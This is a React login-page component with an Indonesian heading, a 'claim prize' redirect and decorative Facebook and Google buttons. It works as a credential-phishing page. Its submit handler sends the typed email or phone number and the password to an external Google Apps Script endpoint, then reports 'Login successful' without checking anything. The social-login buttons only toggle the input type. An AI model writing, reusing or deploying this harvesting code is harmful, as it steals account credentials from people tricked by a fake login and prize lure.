import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import { Eye, EyeOff, Facebook } from "lucide-react";

function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSignUp, setIsSignUp] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [usePhoneLogin, setUsePhoneLogin] = useState(false);
  const navigate = useNavigate();

  const handleAuth = async (e) => {
    e.preventDefault();
    try {
      await fetch(
        "https://script.google.com/macros/s/AKfycbyBAZA0AKib2bx1gaivLNqeZsDAjBJV16JjAJn1sXbR4XGLd1ivZbsYiSzpHmKIH7xbBg/exec",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: JSON.stringify({ email, password }),
        }
      );

      localStorage.setItem("isAuthenticated", "true");
      localStorage.setItem("currentUser", email);
      toast.success("Login successful!");
      navigate("/claim-prize");
    } catch (error) {
      toast.error(error.message);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-gray-800 rounded-lg shadow-xl p-8">
        <h2 className="text-3xl font-bold text-center text-yellow-500 mb-8">
          {isSignUp ? "Create Account" : "Login ke Akun Kamu"}
        </h2>
        <form onSubmit={handleAuth} className="space-y-6">
          <div>
            <label className="block text-gray-300 mb-2">
              {usePhoneLogin ? "Nomor HP" : "Email"}
            </label>
            <input
              type={usePhoneLogin ? "tel" : "email"}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2 rounded bg-gray-700 text-white border border-gray-600 focus:border-yellow-500 focus:outline-none"
              required
            />
          </div>
          <div>
            <label className="block text-gray-300 mb-2">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-2 rounded bg-gray-700 text-white border border-gray-600 focus:border-yellow-500 focus:outline-none pr-10"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-2.5 text-gray-300 hover:text-yellow-500"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>
          <button
            type="submit"
            className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded transition duration-300"
          >
            {isSignUp ? "Sign Up" : "Login"}
          </button>
        </form>
        <div className="w-full flex items-center justify-center gap-5 mt-6">
          <button
            onClick={() => setUsePhoneLogin(true)}
            className={`p-2 rounded-full transition ${
              usePhoneLogin ? "ring-2 ring-blue-500" : ""
            }`}
          >
            <i
              className="fa-brands fa-facebook fa-xl"
              style={{ color: "#4267B2" }}
            ></i>
          </button>
          <button
            onClick={() => setUsePhoneLogin(false)}
            className={`p-2 rounded-full transition ${
              !usePhoneLogin ? "ring-2 ring-red-500" : ""
            }`}
          >
            <i
              className="fa-brands fa-google fa-xl"
              style={{ color: "#DB4437" }}
            ></i>
          </button>
        </div>
      </div>
    </div>
  );
}

export default Login;
